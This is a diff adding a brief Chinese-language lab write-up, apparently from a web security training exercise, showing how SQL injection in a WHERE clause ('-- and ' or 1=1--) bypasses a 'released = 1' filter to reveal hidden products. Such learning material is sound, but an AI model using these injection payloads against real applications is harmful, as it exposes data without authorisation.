@@ -1,0 +1,24 @@
+WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据：
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+总共12个产品，AND released = 1说明只展示了已发布的产品，我们要通过WHERE 来注入漏洞并检索隐藏数据
+
+Gifts栏3个产品
+
+'注入报错： Inter server error
+
+添加'--， 使得--' AND released = 1被注释掉
+
+SELECT * FROM products WHERE category = ''
+					--' AND released = 1
+
+添加' or 1=1--
+
+SELECT * FROM products WHERE category = '' or 1=1
+					--' AND released = 1
+
+category = '' or 1=1 空或者1=1，结果为真返回所有产品
+
+
+
